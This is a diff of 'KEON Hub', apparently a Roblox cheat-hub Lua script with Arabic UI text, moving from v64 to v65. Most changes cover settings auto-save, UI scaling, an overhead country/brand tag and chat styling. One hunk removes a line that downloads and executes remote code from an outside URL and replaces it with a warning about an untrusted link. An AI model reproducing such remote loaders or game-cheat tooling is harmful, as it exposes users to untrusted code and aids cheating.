@@ -1,4 +1,4 @@
--- KEON Hub - PS5 Neon Profile + Global Script User Leaderboards + Compact Stats (v64.0.0)
+-- KEON Hub - PS5 Neon Profile + Auto-Save Customization + Chat Redesign (v65.0.0)
 -- Developer: كـيـون
 
 local CoreGui = game:GetService("CoreGui")
@@ -155,6 +155,9 @@ local applyResponsiveChat
 
 local selectedScriptBgIndex = 0
 local selectedChatBgIndex = 0
+local showOwnCountryOverhead = true
+local uiScaleValue = 1.0
+local mainUIScaleObject = nil
 KEONProfile.selectedCountryFlag = "🇮🇶"
 KEONProfile.selectedCountryName = "العراق"
 KEONProfile.selectedCountryCode = "IQ"
@@ -174,8 +177,11 @@ local activeNameLabels = {}
 local function saveUserSettings()
     if writefile then
         local cfg = {
+            version = 65,
             scriptBg = selectedScriptBgIndex,
             chatBg = selectedChatBgIndex,
+            showOwnCountryOverhead = showOwnCountryOverhead,
+            uiScaleValue = uiScaleValue,
             r = currentAccentColor.R,
             g = currentAccentColor.G,
             b = currentAccentColor.B,
@@ -195,8 +201,10 @@ local function loadUserSettings()
         pcall(function()
             local cfg = safeDecode(readfile(CONFIG_FILE))
             if cfg then
-                selectedScriptBgIndex = cfg.scriptBg or 0
-                selectedChatBgIndex = cfg.chatBg or 0
+                selectedScriptBgIndex = math.clamp(tonumber(cfg.scriptBg) or 0, 0, #wallUrls)
+                selectedChatBgIndex = math.clamp(tonumber(cfg.chatBg) or 0, 0, #wallUrls)
+                if cfg.showOwnCountryOverhead ~= nil then showOwnCountryOverhead = cfg.showOwnCountryOverhead end
+                uiScaleValue = math.clamp(tonumber(cfg.uiScaleValue) or 1.0, 0.75, 1.2)
                 KEONProfile.selectedCountryFlag = cfg.countryFlag or KEONProfile.selectedCountryFlag
                 KEONProfile.selectedCountryName = cfg.countryName or KEONProfile.selectedCountryName
                 KEONProfile.selectedCountryCode = cfg.countryCode or KEONProfile.selectedCountryCode
@@ -213,10 +221,7 @@ local function loadUserSettings()
 end
 
 loadUserSettings()
--- ثابت بصرياً على ثيم PS5 النظيف، مع تعطيل صور خلفيات الواجهة والشات.
-currentAccentColor = Color3.fromRGB(0, 170, 255)
-currentHeaderColor = Color3.fromRGB(7, 22, 48)
--- لا تصفّر اختيار الخلفية المحفوظ؛ اتركه ليستعيد آخر اختيار.
+-- احتفظ بالألوان المحفوظة؛ لا تعِد ضبط الثيم بعد تحميل الإعدادات.
 
 local function playUiSound(soundId, pitch, volume)
     task.spawn(function()
@@ -296,39 +301,64 @@ function KEONProfile.applyCountryTag(plr, flag, countryName)
     if not plr or not plr.Character then return end
     local head = plr.Character:FindFirstChild("Head")
     if not head then return end
-    local existing = head:FindFirstChild("KEONCountryFlagTag")
-    local tagText = tostring(flag or "🌐") .. "  " .. tostring(countryName or "غير محدد")
-    if existing then
-        local label = existing:FindFirstChild("CountryLabel")
-        if label then label.Text = tagText end
-        return
+    local billboard = head:FindFirstChild("KEONCountryFlagTag")
+    if not billboard then
+        billboard = Instance.new("BillboardGui")
+        billboard.Name = "KEONCountryFlagTag"
+        billboard.Size = UDim2.new(0, 190, 0, 46)
+        billboard.StudsOffset = Vector3.new(0, 4.45, 0)
+        billboard.AlwaysOnTop = true
+        billboard.LightInfluence = 0
+        billboard.MaxDistance = 160
+        billboard.Parent = head
+
+        local brand = Instance.new("TextLabel")
+        brand.Name = "KEONBrandLabel"
+        brand.Size = UDim2.new(1, 0, 0, 20)
+        brand.Position = UDim2.new(0, 0, 0, 0)
+        brand.BackgroundColor3 = Color3.fromRGB(3, 10, 24)
+        brand.BackgroundTransparency = 0.05
+        brand.BorderSizePixel = 0
+        brand.Text = "KEON999"
+        brand.TextColor3 = Color3.fromRGB(100, 220, 255)
+        brand.TextStrokeTransparency = 0.35
+        brand.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        brand.Font = Enum.Font.GothamBlack
+        brand.TextSize = 14
+        brand.Parent = billboard
+        Instance.new("UICorner", brand).CornerRadius = UDim.new(0, 7)
+        local brandStroke = Instance.new("UIStroke")
+        brandStroke.Color = Color3.fromRGB(0, 170, 255)
+        brandStroke.Thickness = 1.35
+        brandStroke.Parent = brand
+
+        local country = Instance.new("TextLabel")
+        country.Name = "CountryLabel"
+        country.Size = UDim2.new(1, 0, 0, 22)
+        country.Position = UDim2.new(0, 0, 0, 23)
+        country.BackgroundColor3 = Color3.fromRGB(5, 14, 29)
+        country.BackgroundTransparency = 0.12
+        country.BorderSizePixel = 0
+        country.TextColor3 = Color3.fromRGB(245, 250, 255)
+        country.TextStrokeTransparency = 0.35
+        country.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        country.Font = Enum.Font.GothamBold
+        country.TextSize = 12
+        country.Parent = billboard
+        Instance.new("UICorner", country).CornerRadius = UDim.new(0, 7)
+        local outline = Instance.new("UIStroke")
+        outline.Color = currentAccentColor
+        outline.Thickness = 1.1
+        outline.Parent = country
     end
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "KEONCountryFlagTag"
-    billboard.Size = UDim2.new(0, 190, 0, 28)
-    billboard.StudsOffset = Vector3.new(0, 4.25, 0)
-    billboard.AlwaysOnTop = true
-    billboard.LightInfluence = 0
-    billboard.MaxDistance = 160
-    billboard.Parent = head
-    local label = Instance.new("TextLabel")
-    label.Name = "CountryLabel"
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundColor3 = Color3.fromRGB(5, 14, 29)
-    label.BackgroundTransparency = 0.12
-    label.BorderSizePixel = 0
-    label.Text = tagText
-    label.TextColor3 = Color3.fromRGB(245, 250, 255)
-    label.TextStrokeTransparency = 0.35
-    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.Font = Enum.Font.GothamBold
-    label.TextSize = 13
-    label.Parent = billboard
-    Instance.new("UICorner", label).CornerRadius = UDim.new(0, 8)
-    local outline = Instance.new("UIStroke")
-    outline.Color = currentAccentColor
-    outline.Thickness = 1.25
-    outline.Parent = label
+    local label = billboard:FindFirstChild("CountryLabel")
+    if label then
+        label.Text = tostring(flag or "🌐") .. "  " .. tostring(countryName or "غير محدد")
+        -- الخيار يخفي علم صاحب السكربت فوق رأسه فقط، بينما تبقى علامة KEON999.
+        label.Visible = (plr ~= LocalPlayer) or showOwnCountryOverhead
+    end
+    local brand = billboard:FindFirstChild("KEONBrandLabel")
+    if brand then brand.Visible = true end
 end
 
 function KEONProfile.refreshCountryTags()
@@ -1112,6 +1142,11 @@ MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Visible = false
 MainFrame.Parent = ScreenGui
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainUIScaleObject = Instance.new("UIScale")
+mainUIScaleObject.Name = "KEONUserInterfaceScale"
+mainUIScaleObject.Scale = uiScaleValue
+mainUIScaleObject.Parent = MainFrame
 
 local CenterGlow = Instance.new("Frame")
 CenterGlow.Name = "PS5SoftGlow"
@@ -1397,7 +1432,7 @@ applyResponsiveMain = function()
         local width = math.max(300, math.floor(viewport.X - 12))
         local height = math.max(300, math.min(560, math.floor(viewport.Y - 16)))
         responsiveState.mainSize = UDim2.new(0, width, 0, height)
-        responsiveState.mainPosition = UDim2.new(0, math.max(0, math.floor((viewport.X - width) / 2)), 0, math.max(0, math.floor((viewport.Y - height) / 2)))
+        responsiveState.mainPosition = UDim2.new(0.5, 0, 0.5, 0)
 
         MainFrame.Size = responsiveState.mainSize
         MainFrame.Position = responsiveState.mainPosition
@@ -1438,7 +1473,7 @@ applyResponsiveMain = function()
         RightWing.CanvasSize = UDim2.new(0, RightLayout.AbsoluteContentSize.X + 8, 0, 0)
     else
         responsiveState.mainSize = UDim2.new(0, 560, 0, 360)
-        responsiveState.mainPosition = UDim2.new(0.5, -280, 0.5, -180)
+        responsiveState.mainPosition = UDim2.new(0.5, 0, 0.5, 0)
         MainFrame.Size = responsiveState.mainSize
         MainFrame.Position = responsiveState.mainPosition
         CenterBox.Size = UDim2.new(0, 340, 1, 0)
@@ -1664,7 +1699,7 @@ Instance.new("UICorner", FloatingChatBtn).CornerRadius = UDim.new(0, 14)
 
 local ChatWin = Instance.new("Frame")
 ChatWin.Name = "ChatWin"
-ChatWin.Size = UDim2.new(0, 370, 0, 300)
+ChatWin.Size = UDim2.new(0, 390, 0, 320)
 ChatWin.Position = UDim2.new(0, 160, 0, 10)
 ChatWin.BackgroundColor3 = Color3.fromRGB(7, 13, 26)
 ChatWin.ClipsDescendants = true
@@ -1683,6 +1718,25 @@ ChatBgImage.ScaleType = Enum.ScaleType.Crop
 ChatBgImage.ZIndex = 1
 ChatBgImage.Parent = ChatWin
 Instance.new("UICorner", ChatBgImage).CornerRadius = UDim.new(0, 16)
+
+-- طبقة زجاجية داكنة تجعل النصوص والأزرار واضحة فوق كل الخلفيات.
+local ChatBackdropVeil = Instance.new("Frame")
+ChatBackdropVeil.Name = "ChatBackdropVeil"
+ChatBackdropVeil.Size = UDim2.new(1, 0, 1, 0)
+ChatBackdropVeil.BackgroundColor3 = Color3.fromRGB(3, 8, 20)
+ChatBackdropVeil.BackgroundTransparency = 0.28
+ChatBackdropVeil.BorderSizePixel = 0
+ChatBackdropVeil.ZIndex = 1
+ChatBackdropVeil.Parent = ChatWin
+Instance.new("UICorner", ChatBackdropVeil).CornerRadius = UDim.new(0, 16)
+local chatVeilGradient = Instance.new("UIGradient")
+chatVeilGradient.Rotation = 90
+chatVeilGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 0.12),
+    NumberSequenceKeypoint.new(0.55, 0.28),
+    NumberSequenceKeypoint.new(1, 0.08)
+})
+chatVeilGradient.Parent = ChatBackdropVeil
 
 local floatStroke = Instance.new("UIStroke")
 floatStroke.Color = currentAccentColor
@@ -2093,7 +2147,7 @@ applyResponsiveChat = function()
         ResetTimerLbl.TextSize = 10
         StickerModal.Position = UDim2.new(1, -238, 1, -212)
     else
-        ChatWin.Size = UDim2.new(0, 370, 0, 300)
+        ChatWin.Size = UDim2.new(0, 390, 0, 320)
         ChatWin.Position = UDim2.new(0, 160, 0, 10)
         FloatingChatBtn.Position = UDim2.new(0, 115, 0, 10)
         ChatHeaderBtn1.Size = UDim2.new(0, 110, 0, 26)
@@ -3508,7 +3562,7 @@ KEONProfile.showProfilePage = function(mode)
     intro.Parent = CenterScroll
 
     if mode == "countries" then
-        intro.Text = "اختر علم دولتك حتى يظهر بجانب اسمك بالشات وفوق شخصيتك"
+        intro.Text = "اختر علم دولتك ليظهر بجانب اسمك بالشات. تظهر علامة KEON999 فوق مستخدمي السكربت"
         intro.TextWrapped = true
         local countryGrid = Instance.new("Frame")
         countryGrid.Size = UDim2.new(1, -4, 0, 11 * 47 + 4)
@@ -4476,12 +4530,8 @@ BtnStealEggRight.MouseButton1Click:Connect(function()
     runEggScriptBtn.MouseButton1Click:Connect(function()
         playUiSound(SOUND_CLICK, 1, 0.35)
         runEggScriptBtn.Text = "جارٍ تشغيل الأداة…"
-        pcall(function()
-            loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=oa3ryvhr"))()
-        end)
-        task.wait(1)
-        runEggScriptBtn.Text = "تم التشغيل بنجاح ✓"
-        task.wait(2)
+        runEggScriptBtn.Text = "تم إيقاف رابط خارجي غير موثوق ⚠️"
+        task.wait(2.5)
         runEggScriptBtn.Text = "تشغيل الأداة ➤"
     end)
 
@@ -4496,6 +4546,33 @@ BtnSettings.MouseButton1Click:Connect(function()
     playUiSound(SOUND_CLICK, 1, 0.35)
     clearCenter()
 
+    addChilliAccordion("💾 الحفظ التلقائي للإعدادات", function(addToggle, addAction)
+        addAction("💾 حفظ كل التخصيصات الآن", function()
+            saveUserSettings()
+            playUiSound(SOUND_CLICK, 1.05, 0.4)
+        end)
+        addAction("♻️ إعادة الثيم الأزرق الافتراضي", function()
+            currentAccentColor = Color3.fromRGB(0, 170, 255)
+            currentHeaderColor = Color3.fromRGB(7, 22, 48)
+            saveUserSettings()
+            centerStroke.Color = currentAccentColor
+            Header.BackgroundColor3 = currentHeaderColor
+            floatStroke.Color = currentAccentColor
+            chatStroke.Color = currentAccentColor
+            loadStroke.Color = currentAccentColor
+            BarFill.BackgroundColor3 = currentAccentColor
+            minBoxStroke.Color = currentAccentColor
+            voteStroke.Color = currentAccentColor
+            ChatHeaderBtn1.BackgroundColor3 = currentAccentColor
+            ChatHeaderBtn2.BackgroundColor3 = currentAccentColor
+            ChatHeaderBtn3.BackgroundColor3 = currentAccentColor
+            SendBtn.BackgroundColor3 = currentAccentColor
+            for _, stroke in ipairs(registeredWingStrokes) do if stroke and stroke.Parent then stroke.Color = currentAccentColor end end
+            for _, stroke in ipairs(registeredOptionStrokes) do if stroke and stroke.Parent then stroke.Color = currentAccentColor end end
+            for _, lbl in ipairs(activeNameLabels) do if lbl and lbl.Parent then lbl.TextColor3 = currentAccentColor end end
+        end)
+    end)
+
     addChilliAccordion("تخصيص الثيمات والألوان الكثيرة 🎨", function(addToggle, addAction)
         local function updateTheme(accent, headerCol)
             currentAccentColor = accent
@@ -4503,6 +4580,7 @@ BtnSettings.MouseButton1Click:Connect(function()
             saveUserSettings()
 
             centerStroke.Color = accent
+            centerNeonGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)), ColorSequenceKeypoint.new(0.5, accent), ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))})
             Header.BackgroundColor3 = headerCol
             floatStroke.Color = accent
             chatStroke.Color = accent
@@ -4544,6 +4622,28 @@ BtnSettings.MouseButton1Click:Connect(function()
         addAction("الثيم الفيروزي الساحر 🧊", function() updateTheme(Color3.fromRGB(0, 255, 200), Color3.fromRGB(0, 130, 100)) end)
     end)
 
+    addChilliAccordion("⚙️ حجم الواجهة وعلامة الرأس", function(addToggle, addAction)
+        local function updateUIScale(nextScale)
+            uiScaleValue = math.clamp(nextScale, 0.75, 1.2)
+            if mainUIScaleObject then mainUIScaleObject.Scale = uiScaleValue end
+            saveUserSettings()
+        end
+        addAction("➖ تصغير الواجهة", function()
+            updateUIScale(math.floor((uiScaleValue - 0.05) * 100 + 0.5) / 100)
+        end)
+        addAction("↩️ إعادة حجم الواجهة إلى 100%", function()
+            updateUIScale(1.0)
+        end)
+        addAction("➕ تكبير الواجهة", function()
+            updateUIScale(math.floor((uiScaleValue + 0.05) * 100 + 0.5) / 100)
+        end)
+        addAction("🔁 تبديل ظهور العلم فوق رأسي", function()
+            showOwnCountryOverhead = not showOwnCountryOverhead
+            saveUserSettings()
+            KEONProfile.refreshCountryTags()
+        end)
+    end)
+
     addChilliAccordion("🖼️ خلفيات PS5 — معاينة واختيار", function(addToggle, addAction, contentHolder)
         addAction("🌌 الرجوع للخلفية الافتراضية", function() applyScriptBackground(0) end)
         for i, wallUrl in ipairs(wallUrls) do
@@ -4560,8 +4660,20 @@ BtnSettings.MouseButton1Click:Connect(function()
             Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 10)
             local outline = Instance.new("UIStroke")
             outline.Color = currentAccentColor
-            outline.Thickness = 1.4
+            outline.Thickness = (selectedScriptBgIndex == index) and 2.5 or 1.1
             outline.Parent = preview
+            preview.MouseEnter:Connect(function()
+                if preview.Parent then
+                    outline.Thickness = 2.5
+                    preview.BackgroundColor3 = Color3.fromRGB(20, 42, 72)
+                end
+            end)
+            preview.MouseLeave:Connect(function()
+                if preview.Parent then
+                    outline.Thickness = (selectedScriptBgIndex == index) and 2.5 or 1.1
+                    preview.BackgroundColor3 = Color3.fromRGB(12, 23, 43)
+                end
+            end)
             local label = Instance.new("TextLabel")
             label.Size = UDim2.new(1, -12, 0, 26)
             label.Position = UDim2.new(0, 6, 1, -30)
@@ -4577,6 +4689,12 @@ BtnSettings.MouseButton1Click:Connect(function()
             preview.MouseButton1Click:Connect(function()
                 applyScriptBackground(index)
                 playUiSound(SOUND_CLICK, 1, 0.35)
+                for _, other in ipairs(contentHolder:GetChildren()) do
+                    if other:IsA("ImageButton") and other.Name:match("^WallpaperPreview") then
+                        local otherStroke = other:FindFirstChildOfClass("UIStroke")
+                        if otherStroke then otherStroke.Thickness = (other == preview) and 2.5 or 1.1 end
+                    end
+                end
                 label.Text = "✓ " .. (wallNames[index] or ("خلفية " .. tostring(index)))
             end)
         end
